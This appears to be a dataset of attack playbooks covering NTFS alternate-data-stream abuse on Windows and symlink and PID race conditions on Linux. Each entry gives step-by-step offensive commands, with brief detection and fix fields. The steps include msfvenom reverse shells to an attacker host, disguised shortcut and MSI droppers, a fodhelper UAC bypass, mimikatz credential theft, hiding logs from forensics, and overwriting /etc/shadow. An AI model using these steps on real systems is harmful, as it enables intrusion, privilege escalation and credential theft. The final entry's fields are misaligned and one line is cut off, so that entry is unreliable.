Attack Steps: Step 1: On a Windows NTFS system, prepare a reverse shell or privilege escalation payload using: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o elev.exe. Step 2: Create a normal-looking document file like invoice.pdf or README.txt and save it in a shared folder or on the desktop. This is your bait file. Step 3: Hide the payload in the ADS of this file using CMD: type elev.exe > README.txt:adminloader.exe. The malware is now stored invisibly within the text file. Step 4: Create a shortcut file (.lnk) that launches the hidden ADS using PowerShell. Right-click on Desktop → New → Shortcut → enter this as location: powershell -WindowStyle Hidden -Command Start-Process "README.txt:adminloader.exe". Save it as Open README.lnk. Step 5: Rename it to look like the original file: e.g., README.txt.lnk. It visually resembles the trusted file but triggers the hidden ADS. Step 6: Send this shortcut to the victim or place it on a shared folder. If the user has admin rights and double-clicks this thinking it's a document, the payload inside the ADS executes with elevated context. Step 7: If UAC is disabled or a misconfigured system trusts the launch, your payload gains privilege elevation. Step 8: Confirm the meterpreter session opens on your attacker listener (msfconsole -x "use exploit/multi/handler" etc.). Step 9: This can also be paired with startup folders or login scripts to auto-launch when admin logs in. Step 10: Defenders must monitor shortcut behavior and processes launched from .lnk files, especially from ADS paths. Check explorer.exe spawns. Use dir /R to list hidden ADS.
Vulnerability: Admin user launches file with invisible ADS execution path
MITRE Technique: T1055 – Process Injection; T1564.004 – NTFS File Attributes
Detection Method: Monitor .lnk behavior; trace parent-child process chains (e.g., Explorer.exe → PowerShell → ADS). Use EDR logs.
Solution: Disable ADS, restrict PowerShell, block .lnk launch of ADS via AppLocker or GPO; educate users about shortcut risks.
Tags: ADS, Privilege Escalation, LNK Abuse, User Elevation

Title: ADS as Bypass of File Path ACLs
Attack Type: Use ADS to store executable in path protected by NTFS ACL restrictions
Scenario Description: Attackers hide payloads in ADS of ACL-protected or restricted files to bypass access control checks without modifying the visible file.
Attack Steps: Step 1: Identify a system folder or file protected with NTFS permissions (Access Control Lists). For example, C:\Program Files\TrustedApp\config.ini. This file is read-only and write-protected for normal users. Step 2: Try modifying the file directly to confirm it's protected: notepad C:\Program Files\TrustedApp\config.ini → edit → save → you'll get an access denied error. Step 3: However, on NTFS, even if you don’t have permission to overwrite the main data stream, you can still write to an ADS if permissions are not explicitly blocked. Step 4: Create a malicious payload: msfvenom -p windows/messagebox TEXT="Bypassed ACL" -f exe -o hello.exe. Step 5: Inject the payload into ADS of the protected file: type hello.exe > "C:\Program Files\TrustedApp\config.ini:adsbypass.exe". This will succeed even if the user lacks full control on config.ini, because ACLs often apply to the main stream, not the ADS. Step 6: Now launch the hidden stream with: Start-Process "C:\Program Files\TrustedApp\config.ini:adsbypass.exe" or script it with PowerShell. Step 7: This allows a non-admin attacker to store and execute payloads in “protected” directories — a stealthy bypass. Step 8: This works especially well in shared folders or misconfigured directories where files are trusted but not audited for ADS. Step 9: You can also test persistence by storing the payload in ADS of read-only system files. Step 10: Defenders should use icacls to apply full stream protection or deny all write access to folders, not just files. Step 11: Use streams.exe or dir /R to audit existing ADS in trusted directories.
Vulnerability: NTFS allows alternate stream writes even on protected files
MITRE Technique: T1564.004 – Hide Artifacts: NTFS File Attributes
Impact: Bypass access controls, hidden file placement
Detection Method: Monitor for process execution from NTFS ADS; scan system files for attached streams; validate ACLs recursively.
Solution: Lock down folders with deny-write at directory level; enforce scanning of ADS; remove write rights to trusted files.
Tags: ADS, NTFS ACL Bypass, Hidden Executables, File Abuse

Title: ADS Malware via MSI/Payload Dropper
Attack Type: Drop payload in ADS, trigger from installer or shortcut launcher (LNK)
Scenario Description: Attackers embed ADS-based malware inside files used by MSI installers or shortcuts, using social engineering to trick users into running the hidden code.
Tools Used: Orca (MSI editor), msfvenom, CMD, PowerShell, Notepad, Windows Shortcut
Attack Steps: Step 1: On a Windows NTFS test machine, generate a reverse shell payload using: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o stage.exe. This payload will be hidden in an alternate data stream. Step 2: Create a decoy file such as setup.msi or download a legitimate MSI installer to abuse (e.g., VLCSetup.msi). Step 3: Attach the malicious payload to the MSI file via ADS using: type stage.exe > setup.msi:payload.exe. This embeds the executable inside the MSI file, making it invisible during normal use. Step 4: Now create a shortcut that pretends to launch the installer, but actually launches the ADS malware. Right-click on desktop → New → Shortcut → for location, use: powershell -WindowStyle Hidden -Command Start-Process 'setup.msi:payload.exe'. Name it something like Install VLC.lnk. Step 5: Social engineer the user by telling them it's a setup link, or hide it inside an auto-extracting ZIP/RAR. When the user double-clicks the shortcut, it executes the hidden payload inside the MSI’s ADS. Step 6: For advanced evasion, edit the MSI with Orca (from Microsoft’s Windows SDK) and add a CustomAction to launch the ADS during install (e.g., CustomAction RunADSExe Path="setup.msi:payload.exe"). Step 7: Now, even if the user runs the original installer, the malware is executed during or after installation. Step 8: If the user is an administrator, you can achieve privilege escalation. Even standard users can give persistence. Step 9: Use msfconsole to catch the session. Step 10: Clean up by deleting both the shortcut and MSI file; ADS is deleted with it. Step 11: Defenders must monitor shortcut behavior, inspect MSI installers using Orca or MSI logging, and scan ADS using streams.exe.
Vulnerability: Social engineering, execution from MSI + ADS stealth storage
MITRE Technique: T1566 – Phishing; T1564.004 – NTFS File Attributes
Impact: Code execution via user trust, stealth malware delivery
Detection Method: Scan .lnk shortcut commands; inspect MSI CustomActions; monitor PowerShell spawning from GUI shells or shortcuts
Solution: Block ADS-based execution paths; scan installers before deployment; restrict PowerShell and .lnk from executing ADS
Tags: MSI Abuse, ADS, Dropper, Social Engineering, Shortcut Abuse

Title: Evading Detection Tools / AV via ADS
Attack Type: Hide malware in NTFS ADS streams to avoid antivirus or EDR detection
Scenario Description: Attackers store payloads in ADS streams of benign files, which are often ignored by legacy antivirus or endpoint detection tools.
Tools Used: CMD, PowerShell, streams.exe, Windows Defender, third-party AV tools
Attack Steps: Step 1: On a Windows NTFS machine, create a test executable: msfvenom -p windows/x64/messagebox TEXT="Hello from ADS" -f exe -o msg.exe (this is benign for testing). Step 2: Create a dummy file like cover.txt and store it in Documents or Public folder. Step 3: Use type msg.exe > cover.txt:payload.exe to hide the EXE in ADS. The hidden executable is now cover.txt:payload.exe. Step 4: Open Windows Defender and scan the folder. You will see that Defender does not detect the payload, because most AVs don’t scan alternate streams unless specifically configured. Step 5: Attempt to run the payload: Start-Process "cover.txt:payload.exe". If Defender is configured normally, it likely won’t block or quarantine this unless real-time monitoring is extended to ADS. Step 6: Use third-party antivirus (like Avast, Kaspersky) and scan again — many will still miss the payload if not doing ADS-aware scans. Step 7: Now place this cover.txt inside a trusted system path (e.g., %APPDATA%, %PROGRAMDATA%) and schedule it to execute on logon via registry or Task Scheduler. This achieves stealthy persistence. Step 8: You can also place it under Office documents or PDFs (resume.pdf:evil.exe) and social-engineer the target to click a shortcut pointing to it. Step 9: To verify how well the ADS hides from tools, use streams.exe (Sysinternals): run streams.exe cover.txt — this is one of few tools that reveals it. Step 10: Clean up with: del cover.txt — this removes the ADS as well. Step 11: This method is powerful because it bypasses both signature-based AV and casual filesystem scanning.
Vulnerability: ADS not scanned by default by many AV and EDR tools
MITRE Technique: T1027 – Obfuscated Files or Information; T1564.004 – NTFS File Attributes
Detection Method: Use tools like streams.exe, dir /R, and advanced AV with ADS scanning; monitor PowerShell/CMD execution of ADS
Solution: Configure AV/EDR to scan ADS; alert on PowerShell execution from ADS; use file integrity monitoring on NTFS volumes
Tags: AV Evasion, ADS, Malware Obfuscation, Payload Hiding

Title: Triggering ADS via Vulnerable Apps
Attack Type: App parses file but unintentionally loads or executes hidden ADS content
Scenario Description: Some Windows applications unsafely read or process data from files, unknowingly including alternate data streams (ADS), allowing attackers to trigger hidden code.
Tools Used: Any app using fopen() or .NET File.ReadAllBytes(), CMD, Notepad, Custom Script
Attack Steps: Step 1: On a Windows NTFS system, identify an application that allows file input—this could be a log parser, media player, config reader, or scripting tool (e.g., a backup tool or Notepad++ plugin). Step 2: Create a payload using msfvenom: msfvenom -p windows/x64/messagebox TEXT="ADS Triggered!" -f exe -o payload.exe. This is a test harmless payload to simulate execution. Step 3: Choose a file the vulnerable app will open or parse. For example: config.ini, data.txt, or even image.jpg. Place this file in a folder accessible by the app (e.g., %APPDATA% or its working directory). Step 4: Attach the payload to the file as an ADS: type payload.exe > config.ini:trigger.exe. The base file remains unchanged in size and content, but now contains hidden code. Step 5: Now use a wrapper script, plugin, or LNK that tells the application to open or execute the file using unsafe parsing. For instance, if the app has a batch file or user script like parse config.ini, an attacker could change it to: Start-Process "config.ini:trigger.exe" if scripting support exists. Step 6: Some poorly written applications that auto-load or scan content may use wildcard input (config.*), potentially matching ADS files if the system isn't hardened. Step 7: Another variant is exploiting file handling via drag-and-drop—some apps open dragged files and their alternate streams depending on how the Windows API (like CreateFileW) is used. Step 8: When the app reads the file or calls the path, the ADS payload is triggered unintentionally. This results in arbitrary code execution without directly touching the app binary. Step 9: You now have stealthy execution via app trust, especially if the app runs with elevated privileges (e.g., backup apps, script runners). Step 10: Detect by monitoring applications executing subprocesses, reading unexpected paths (with :), or using ProcMon to see if an app accesses ADS.
Vulnerability: Unsafe file parsing / poor I/O validation in custom apps
MITRE Technique: T1203 – Exploitation for Client Execution; T1564.004 – ADS
Impact: Arbitrary execution via trusted software logic
Detection Method: Monitor app I/O behavior with ProcMon; look for child process from user apps or : paths in logs
Solution: Harden app file handlers; strip or sanitize file input; block execution from ADS using policy or AppLocker
Tags: ADS, File Parsing, Application Exploit, Logic Abuse

Title: Windows Installer Abuse using ADS
Attack Type: Abuse .MSI files to hide and launch ADS payloads during or after install
Scenario Description: Attackers leverage Windows Installer (MSI) to store payloads in ADS streams and execute them during installation using CustomActions or post-install triggers.
Tools Used: Orca (MSI editor), msfvenom, CMD, PowerShell, msiexec, Notepad
Attack Steps: Step 1: On a Windows NTFS machine, generate a payload using: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o rev.exe. This is your malicious payload. Step 2: Create or download a legitimate .msi installer—this can be any simple MSI file used by end users (e.g., vlcsetup.msi). Copy it to your working folder. Step 3: Attach your payload to the installer file as an ADS using CMD: type rev.exe > vlcsetup.msi:installcore.exe. Now the malicious EXE is hidden inside the MSI without altering its visible behavior or checksums. Step 4: Open the MSI in Orca (Windows SDK tool) and navigate to CustomAction table. Step 5: Add a new CustomAction: Name: RunCore, Type: 226 (EXE command line), Target: powershell.exe -WindowStyle Hidden -Command Start-Process 'vlcsetup.msi:installcore.exe'. This will execute the ADS payload during install. Step 6: In the InstallExecuteSequence table, insert RunCore to run after InstallFinalize. Save and exit Orca. Step 7: Now, whenever a user runs vlcsetup.msi, the original software installs correctly but also silently runs the hidden payload. Step 8: If the user is an administrator, the payload runs with full privileges. Even with a standard user, this could be chained with escalation payloads. Step 9: Use msfconsole to catch reverse shell if needed. Step 10: ADS remains invisible in Explorer or antivirus scan unless manually searched with streams.exe or dir /R. Step 11: To test detection, scan with Defender or upload to VirusTotal—it will likely miss the payload unless you extract the stream manually. Step 12: For defenders: check MSI contents with Orca, disable MSI execution from untrusted locations, and scan ADS with tools like streams.
Vulnerability: MSI installers allow silent CustomActions that can run ADS
MITRE Technique: T1059 – Command Execution; T1564.004 – NTFS File Attributes
Impact: Code execution with elevated rights during install
Detection Method: Inspect MSI CustomAction table; scan ADS using Sysinternals tools; block unsigned MSI use
Solution: Block or restrict MSI execution via GPO; disallow custom install actions; enable ADS scanning in AV
Tags: MSI Abuse, ADS, Installer Hijack, Payload Dropper

Title: ADS Used with NTFS Reparse Points
Attack Type: Combine NTFS ADS with directory junctions/symlinks for stealth execution
Scenario Description: Attackers abuse NTFS reparse points (junctions/symlinks) to redirect execution into an ADS payload while bypassing sandbox restrictions or user folder policies.
Attack Steps: Step 1: On a Windows NTFS test machine, generate a payload using: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o shell.exe. This will simulate malicious code. Step 2: Create a decoy file in a user-writable directory, like C:\Users\Public\report.txt. Step 3: Attach the payload to this file via ADS using: type shell.exe > C:\Users\Public\report.txt:ntfs.exe. Step 4: Create an empty folder, say C:\Temp\ReparsePoint. Then delete the folder: rmdir C:\Temp\ReparsePoint. Step 5: Now create a junction (reparse point) that points to a folder with execution permission — often C:\Windows\System32 or %APPDATA%: mklink /J C:\Temp\ReparsePoint "C:\Users\Public". Step 6: Create a PowerShell or batch file that references the ADS inside the reparse folder path: Start-Process "C:\Temp\ReparsePoint\report.txt:ntfs.exe". This tricks apps or sandbox software into believing execution is coming from a safe location (C:\Temp), while it’s actually loading the payload from ADS inside C:\Users\Public. Step 7: You can place this script in startup folders, task scheduler, or use a vulnerable app that allows plugin execution from user-defined paths. Step 8: Some AV or sandbox tools ignore ADS or skip analysis if the file path appears harmless or temporary. Reparse points + ADS help bypass such filters. Step 9: Test the redirect and catch the session via msfconsole. Step 10: Clean up: rmdir C:\Temp\ReparsePoint, del report.txt. Step 11: Defenders should scan for junctions and symbolic links using fsutil reparsepoint query, and inspect directories with dir /R for ADS.
Vulnerability: ADS + reparse points enable execution redirection + stealth
MITRE Technique: T1556 – Modify Authentication Process; T1564.004 – NTFS ADS
Detection Method: Monitor for unusual symlink or junction creation; check execution paths involving ADS and unknown reparse targets.
Solution: Block user-level reparse creation; restrict execution from redirected paths; disable untrusted ADS via GPO or AppLocker.
Tags: ADS, Reparse Points, Symlinks, File System Abuse

Title: ADS + UAC Bypass Trick
Attack Type: Chain trusted UAC auto-elevated binaries with ADS payload execution
Scenario Description: Attackers hide a payload in ADS and trigger it via a trusted UAC bypass method (e.g., fodhelper, sdclt, eventvwr) to escalate privileges silently.
Tools Used: PowerShell, msfvenom, fodhelper.exe, Registry Editor, CMD
Attack Steps: Step 1: On an NTFS-formatted Windows system, generate a payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o uac.exe. This payload will be embedded and launched via a UAC bypass. Step 2: Choose a decoy file — such as note.txt — and place it somewhere like C:\Users\Public\. Hide the payload using ADS: type uac.exe > C:\Users\Public\note.txt:admin.exe. This file is now invisible to users and antivirus (in many cases). Step 3: Open Registry Editor (regedit.exe) and navigate to: HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command. This registry path is abused by fodhelper.exe, a Windows binary that auto-elevates without triggering UAC prompt. Step 4: Set the default key in that registry path to: powershell -WindowStyle Hidden -Command Start-Process 'C:\Users\Public\note.txt:admin.exe'. Step 5: Create a new DelegateExecute key (string value, leave it blank). Step 6: Now run fodhelper.exe from Start menu or via CMD — it auto-elevates and launches the PowerShell command which in turn executes the ADS payload with admin privileges — without any UAC popup. Step 7: You now have elevated shell access via ADS and UAC bypass. Capture session via msfconsole. Step 8: Clean up: delete the registry key and the decoy file. Step 9: Defenders can detect this by monitoring writes to HKCU\Software\Classes\ms-settings and unexpected PowerShell calls from fodhelper.exe. Step 10: Block fodhelper and similar binaries from untrusted paths using AppLocker, or monitor registry changes with Sysmon.
Vulnerability: Trusted UAC bypass binary + hidden ADS launch path
MITRE Technique: T1548.002 – Bypass User Access Control; T1564.004 – ADS
Impact: Privilege escalation with zero prompt visibility
Detection Method: Log registry key changes (Sysmon Event ID 13); monitor fodhelper.exe or sdclt.exe launching PowerShell or ADS paths
Solution: Disable known UAC bypass vectors; block auto-elevation of fodhelper; scan registry for launch paths invoking ADS
Tags: UAC Bypass, ADS, Trusted Binary Abuse, Privilege Escalation

Title: Log Tampering with ADS
Attack Type: Hide or redirect logs into NTFS alternate streams to avoid detection
Scenario Description: Attackers write or relocate activity logs to ADS streams to prevent detection by forensic tools or SIEMs that only scan primary file data.
Tools Used: CMD, PowerShell, Notepad, streams.exe, EDR/SIEM, Python loggers
Attack Steps: Step 1: On a Windows NTFS machine, identify or create a folder where application or system logs are stored, for example: C:\ProgramData\AppLogs\. Create a normal log file for testing: echo "Normal log line" > app.log. Step 2: Now simulate tampering by writing malicious activity logs (e.g., file exfiltration details or login attempts) into an alternate data stream (ADS) of this file: echo "Stolen credentials: admin:password123" > app.log:stolen.log. This command creates a hidden alternate stream that won't show in normal tools. Step 3: Verify it’s hidden: open app.log in Notepad — it will show only the safe lines. But your secret content is now in app.log:stolen.log. Step 4: Redirect or overwrite application logging code to use this stream. For example, use Python's open("app.log:stolen.log", "a") in your logger. Now your malicious tool stores logs where SIEM tools and antivirus usually don’t look. Step 5: When log monitoring tools or incident responders pull logs from the filesystem, they’ll only read app.log — not its ADS. Step 6: Optionally, remove incriminating lines from app.log and leave only benign data. Your full trace is hidden in the alternate stream. Step 7: To view the hidden logs, use Sysinternals' streams.exe app.log or CMD: more < app.log:stolen.log. Step 8: This method helps attackers store audit logs, stolen data, or internal activity without leaving a visible trail. Step 9: For more stealth, hide multiple logs in one file: activity.log:1.log, activity.log:2.log, etc. Step 10: Defenders should use recursive scans with ADS-aware tools and monitor applications for suspicious use of stream-based file I/O.
Vulnerability: Log storage not inspected for alternate streams
MITRE Technique: T1070.001 – Clear Windows Event Logs; T1564.004 – NTFS ADS
Detection Method: Use streams.exe, dir /R, or EDR that scans ADS; flag apps writing to alternate streams
Solution: Scan logs with ADS support; monitor file I/O with : paths; disable ADS where possible via Group Policy
Tags: ADS, Log Evasion, Forensics Bypass, Stealth Logging

Title: Token Theft Payload in ADS
Attack Type: Hide credential-stealing payloads in ADS for stealth exfiltration
Scenario Description: Credential theft tools (mimikatz, custom stealers) are stored in ADS to avoid detection and launched during privileged sessions.
Tools Used: Mimikatz, msfvenom, CMD, PowerShell, streams.exe, Procmon
Attack Steps: Step 1: On a Windows NTFS machine, generate a credential-stealing payload (non-malicious test example shown): msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o tokensteal.exe. Alternatively, use mimikatz.exe or a tool like SafetyKatz.exe. Step 2: Choose a trusted-looking decoy file like README.txt in a user-writable location. Use type tokensteal.exe > README.txt:steal.exe to embed the payload into the ADS of the text file. Step 3: Now the malicious payload is hidden in the file — it’s not visible in Explorer, and most AVs will miss it unless they scan ADS streams. Step 4: Prepare a script or scheduled task that runs the ADS payload after user login or session unlock: Start-Process "README.txt:steal.exe". You can do this via HKCU\Software\Microsoft\Windows\CurrentVersion\Run or Task Scheduler. Step 5: When triggered, the hidden payload runs in-memory and attempts to extract tokens, passwords, or hashes (e.g., via sekurlsa::logonpasswords). If session is privileged, cleartext credentials are retrieved. Step 6: The output can be exfiltrated via HTTP POST or stored in another file's ADS (e.g., harmless.log:output.txt). Step 7: To confirm stealth, scan the folder with Windows Defender — the base file README.txt appears safe. But the payload inside is ignored unless ADS scanning is forced. Step 8: Capture the session in msfconsole or review output hidden in alternate streams. Step 9: Clean up with: del README.txt — which also deletes the ADS. Step 10: Defenders should inspect process tree to detect suspicious ADS executions, and configure AV/EDR to scan : files or PowerShell calls launching ADS.
Vulnerability: Payload hidden from AV due to ADS, launched in-session
MITRE Technique: T1003 – OS Credential Dumping; T1564.004 – NTFS ADS
Impact: Credential theft, domain takeover, stealth persistence
Detection Method: Detect PowerShell/CMD launching from ADS paths; monitor registry/task startup; use ADS-aware scanners
Solution: Enable ADS scans in AV; restrict PowerShell use; block .exe from ADS via AppLocker or Defender Attack Surface Reduction
Tags: ADS, Credential Access, Token Theft, AV Bypass

Title: Race Condition Symlink Swap
Attack Type: Replace safe file with symlink to sensitive one during privileged write
Scenario Description: Exploit a privileged process (like root-owned script or daemon) writing to a predictable file by racing to replace that file with a symbolic link to a target like /etc/shadow.
Tools Used: ln -s, watch, strace, sleep, shell scripts
Attack Steps: Step 1: On a Linux system, identify a privileged process (e.g., cron job, init script, SUID binary) that writes to a file in a world-writable or semi-trusted directory like /tmp/, /var/tmp/, or /dev/shm/. Use strace -f -p <PID> or watch logs to discover such behaviors. Step 2: Example: Suppose a daily cron script runs as root and writes a status file to /tmp/status.log. Step 3: You (as an attacker) prepare to race against the script by continuously deleting the file and replacing it with a symbolic link pointing to a protected file, such as /etc/shadow or /root/.bashrc. Step 4: Create a loop: while true; do rm -f /tmp/status.log; ln -s /etc/shadow /tmp/status.log; done — this rapidly swaps the file with a symlink every few milliseconds. Step 5: Wait for the root process to trigger and write to /tmp/status.log. If the timing is right, it will follow the symlink and write into /etc/shadow, corrupting it or letting you inject content (e.g., a known password hash). Step 6: For advanced use, link to /root/.bashrc and inject a command like echo "malicious.sh" >> /root/.bashrc so it runs on root login. Step 7: Once triggered, verify if /etc/shadow was modified: use diff, or if using a .bashrc payload, log in as root and see if your command runs. Step 8: This attack works only if the process doesn't check file ownership after opening, or doesn't use secure open flags (O_NOFOLLOW). Step 9: Clean up the symlink to avoid detection. Step 10: Defenders should scan for symlinks in temporary directories and check if root processes access them unsafely.
Vulnerability: Root processes writing to user-accessible paths using unsafe file open
Impact: Overwrite root-owned files, backdoor system, gain root shell
Detection Method: Monitor symlink creation + access in /tmp/; log writes to sensitive files from user-space

Title: PID-based Race Hijack
Attack Type: Hijack PID-based temporary file used by a privileged process
Scenario Description: Older or insecure apps create temp files based on the PID (like /tmp/app1234.tmp), which attackers can predict and replace before usage.
Tools Used: ps, ls /proc, ln -s, watch, shell scripting
Attack Steps: Step 1: On a Linux system, find a process (SUID binary or root-owned service) that creates temporary files in /tmp/, named after the PID or something predictable (e.g., /tmp/task_<pid>.log). Use strings on binaries or observe logs to find patterns. Step 2: For example, suppose /usr/bin/logproc is SUID root and it creates /tmp/log_<PID>.tmp while running. You can test it by executing: logproc & and checking if the file is created using ls /tmp/. Step 3: Now simulate a real race: write a script that spawns logproc, predicts the PID (e.g., using $$, ps, or /proc/sys/kernel/pid_max), and immediately pre-creates a symlink or malicious file at that path. Example: ln -s /etc/shadow /tmp/log_<next_pid>.tmp. Step 4: When logproc runs, it finds the file already there (your symlink), and writes data to /etc/shadow, or executes commands from it if the app reads data as code. Step 5: If successful, this allows root file corruption or code injection. Step 6: You can fine-tune PID prediction using watch ps -eo pid,comm or timing forks using bash. Step 7: For better race success, create multiple symlinks in advance for a range of PIDs. Example: for i in $(seq 1000 1020); do ln -s /root/.bashrc /tmp/log_$i.tmp; done. Step 8: Clean up all created files or links after execution. Step 9: This attack is most effective on older systems or poor custom binaries. Step 10: Defenders must scan for insecure temp file usage and always recommend using mkstemp() or `O_EXCL
Vulnerability: Linux OS with legacy services or SUID binaries
MITRE Technique: Predictable file paths tied to PID; no uniqueness/safety check
Detection Method: Root file overwrite, token injection, local root escalation
Solution: Monitor for rapid file creation in /tmp/; check for symlinks preempting binaries
Tags: Use secure temp file creation (e.g., mkstemp()); avoid predictable filenames in root-level code
